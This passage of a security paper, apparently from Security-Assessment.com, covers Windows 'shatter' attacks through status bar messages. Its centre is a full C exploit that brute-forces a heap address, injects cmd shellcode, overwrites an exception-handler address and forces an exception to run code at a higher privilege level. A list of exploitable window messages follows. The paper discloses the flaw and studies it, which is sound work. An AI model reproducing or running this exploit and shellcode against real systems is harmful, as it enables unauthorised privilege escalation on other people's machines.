### Parameters for `SB_GETTEXTLENGTH` Message

- **hWndControl**: A handle to the control.
- **Message ID (UINT)**: `SB_GETTEXTLENGTH`.
- **wParam**: An integer value representing the zero-based index of the part from which to retrieve text. This is passed as `(WPARAM) iPart`.
- **lParam**: Must be set to 0 and is not used.

#### Description
The `SB_GETTEXTLENGTH` message returns the length of the text in the specified part of a status bar control. When the correct heap address is guessed and the first part is set to a specific value, this message will return 1. However, many memory addresses can result in a one-character string, so further validation is needed. After finding an address that returns 1, the title bar is set to a string of 0x80, which converts to Unicode `\xAC\x20`. If the address is correct, the next call to `SB_GETTEXTLENGTH` will return a value greater than 1. If the address is incorrect, it will return 1 again.

### Statusbar Overwrite Example

```c
/************************************************************************************* 
* Statusbar Control Shatter Exploit  
* 
* Demonstrates the use of a combination of Windows messages to:
* - Brute force a usable heap address
* - Place structure information inside a process
* - Inject shellcode to a known location
* - Overwrite 4 bytes of a critical memory address
* 
* 4 Variables need to be set for proper execution:
* - tWindow: The title of the program's main window
* - sehHandler: The critical address to overwrite
* - shellcodeaddr: The data space to inject the code
* - heapaddr: The base heap address to start brute forcing
* 
* Local shellcode is Win2kSp4 ENG Hardcoded because of Unicode issues
* Try it out against any program with a status bar
* 
*************************************************************************************/ 
#include <windows.h>
#include <stdio.h>
#include <string.h>

// Local No Null Cmd Shellcode
BYTE exploit[] = 
"\x90\x33\xc9\x66\xb9\x36\x32\xc1\xe1\x09\x66\xb9\x63\x6d\x51\x54\xbb\x5c\x21"
"\x9d\x77\x03\xd9\xff\xd3\xcc\x90"; 

char g_classNameBuf[256];
char tWindow[] = "WindowTitle"; // The name of the main window
long sehHandler = 0x7cXXXXXX; // Critical Address To Overwrite
long shellcodeaddr = 0x7fXXXXXX; // Known Writeable Space Or Global Space
unsigned long heapaddr = 0x00500000; // Base Heap Address
long mainhWnd;

void doWrite(HWND hWnd, long tByte, long address);
void BruteForceHeap(HWND hWnd);
void IterateWindows(long hWnd);

int main(int argc, char *argv[]) {
    HMODULE hMod;
    DWORD ProcAddr;
    long x;

    printf("%% Playing with status bar messages\n");
    printf("%% PI:EMAIL\n\n");

    if (argc == 2)
        sscanf(argv[1], "%lx", &heapaddr);

    printf("%% Using base heap address...0x%xh\n", heapaddr);
    printf("+ Finding %s Window...\n", tWindow);

    mainhWnd = (long)FindWindow(NULL, tWindow);
    if (mainhWnd == NULL) {
        printf("+ Couldn't Find %s Window\n", tWindow);
        return 0;
    }

    printf("+ Found Main Window At......0x%xh\n", mainhWnd);
    IterateWindows(mainhWnd);
    printf("+ Done...\n");

    return 0;
}

void BruteForceHeap(HWND hWnd, long tByte, long address) {
    long retval;
    BOOL foundHeap = FALSE;
    char buffer[5000];

    memset(buffer, 0, sizeof(buffer));
    while (!foundHeap) {
        printf("+ Trying Heap Address.......0x%xh ", heapaddr);
        memset(buffer, 0x58, sizeof(buffer) - 1);

        // Set Window Title
        SendMessage(mainhWnd, WM_SETTEXT, 0, (LPARAM)&buffer);
        // Set Part Contents
        SendMessage(hWnd, SB_SETTEXT, 0, (LPARAM)heapaddr);
        retval = SendMessage(hWnd, SB_GETTEXTLENGTH, 0, 0);
        printf("%d", retval);

        if (retval == 1) {
            // First Retval should be 1
            memset(buffer, 0x80, sizeof(buffer) - 1);
            // Set Window Title
            SendMessage(mainhWnd, WM_SETTEXT, 0, (LPARAM)&buffer);
            // Set Part Contents
            SendMessage(hWnd, SB_SETTEXT, 0, (LPARAM)heapaddr);
            retval = SendMessage(hWnd, SB_GETTEXTLENGTH, 0, 0);
            if (retval > 1) {
                // Second should be larger than 1
                printf(" : %d - Found Heap Address\n", retval);
                return;
            }
        }
        printf("\n");
        heapaddr += 2500;
    }
}

void doWrite(HWND hWnd, long tByte, long address) {
    char buffer[5000];
    memset(buffer, 0, sizeof(buffer));
    memset(buffer, tByte, sizeof(buffer) - 1);

    // Set Window Title
    SendMessage(mainhWnd, WM_SETTEXT, 0, (LPARAM)&buffer);
    // Set Statusbar width
    SendMessage(hWnd, SB_SETPARTS, 1, (LPARAM)heapaddr);
    SendMessage(hWnd, SB_GETPARTS, 1, (LPARAM)address);
}

void IterateWindows(long hWnd) {
    long childhWnd, looper;
    childhWnd = (long)GetNextWindow((HWND)hWnd, GW_CHILD);

    while (childhWnd != NULL) {
        IterateWindows(childhWnd);
        childhWnd = (long)GetNextWindow((HWND)childhWnd, GW_HWNDNEXT);
    }

    GetClassName((HWND)hWnd, g_classNameBuf, sizeof(g_classNameBuf));
    if (strcmp(g_classNameBuf, "msctls_statusbar32") == 0) {
        // Find Heap Address
        BruteForceHeap((HWND)hWnd);
        // Inject shellcode to known address
        printf("+ Sending shellcode to......0x%xh\n", shellcodeaddr);

        for (looper = 0; looper < 4; looper++) {
            doWrite((HWND)hWnd, ((shellcodeaddr >> (looper * 8)) & 0xff), sehHandler + looper);
        }

        // Cause exception
        printf("+ Forcing Unhandled Exception\n");
        SendMessage((HWND)hWnd, SB_GETPARTS, 1, 1);
        printf("+ Done...\n");
        exit(0);
    }
}
```

### Final Summary

Shatter attacks have evolved significantly since the initial vulnerability was discovered. As demonstrated in this document, even the most obscure messages can be exploited to execute unintended code. While there have been discussions about filtering messages to protect interactive applications running in a higher security context, it is becoming clear that the only reliable solution is to avoid running these applications on untrusted user desktops.

Application designers and system administrators must be aware of the risks associated with running high-privileged applications on user desktops and take steps to prevent exploitation. The examples provided in this paper can be used against any interactive application running at a higher level by specifying parameters such as the window title. Successful exploitation would allow a user to execute commands under a higher-level security context.

### Vulnerable Messages

#### Callback Messages
- **WM_TIMER** (A patch has been released for this case)
- **LVM_SORTITEMS**
- **LVM_SORTITEMSEX**
- **EM_SETWORDBREAKPROC**

#### Potentially Vulnerable Messages
- **EM_STREAMOUT**
- **EM_STREAMIN**
- **EM_SETHYPHENATEINFO**
- **TVM_SORTCHILDRENCB**

#### Overwrite Messages
- **HDM_GETITEMRECT**
- **HDM_GETORDERARRAY**
- **HDM_GETITEM**
- **LVM_CREATEDRAGIMAGE**
- **LVM_GETCOLUMNORDERARRAY**
- **LVM_GETITEM**
- **LVM_GETITEMPOSITION**
- **LVM_GETITEMRECT**
- **LVM_GETITEMTEXT**
- **LVM_GETNUMBEROFWORKAREAS**
- **LVM_GETSUBITEMRECT**
- **LVM_GETVIEWRECT**
- **PBM_GETRANGE**
- **SB_GETPARTS**
- **TB_GETITEMRECT**
- **TB_GETMAXSIZE**
- **TCM_GETITEM**
- **TCM_GETITEMRECT**
- **TVM_GETITEM**
- **TVM_GETITEMRECT**

### References
- [Security-Assessment.com](http://security.tombom.co.uk/shatter.html)
- [iDefense Shatter Redux](http://www.idefense.com/idpapers/Shatter_Redux.pdf)
- [Microsoft Developer Network](http://msdn.microsoft.com/library/en-us/shellcc/platform/commctls/wincontrols.asp)
- [Microsoft TechNet Security News](http://www.microsoft.com/TechNet/Security/news/htshat.asp)
- [Microsoft Security Bulletin MS02-071](http://www.microsoft.com/technet/security/bulletin/MS02-071.asp)
- [Next Generation Security Software](http://www.nextgenss.com/advisories/utilitymanager.txt)
- [SecurityFocus](http://www.securityfocus.com/bid/5408/exploit/)
- [McAfee Shatter SEH Exploit](http://www.securityfocus.com/data/vulnerabilities/exploits/mcafee-shatterseh2.c)

### About Security-Assessment.com
Security-Assessment.com is a team of Information Security consultants providing high-quality services to clients across the UK, Europe, and Australasia. We offer independent advice, in-depth knowledge, and technical expertise to a range of clients, from small businesses to large corporations. Our solutions are based on proven security principles and practices, combined with leading software and hardware solutions. We help our clients generate simple and appropriate security solutions that are easy to understand and use. We also lead the market in online security compliance applications, including ISO 17799, which helps companies ensure they are in line with best practices for Information Security Management.

### Copyright Information
These articles are free to view in electronic form, but Security-Assessment.com and the original publishers maintain their copyrights. You may copy, republish, or store them on your computer, provided the document is not altered, and the original copyrights and credits to the authors are maintained, except where explicitly agreed otherwise by Security-Assessment.com Ltd.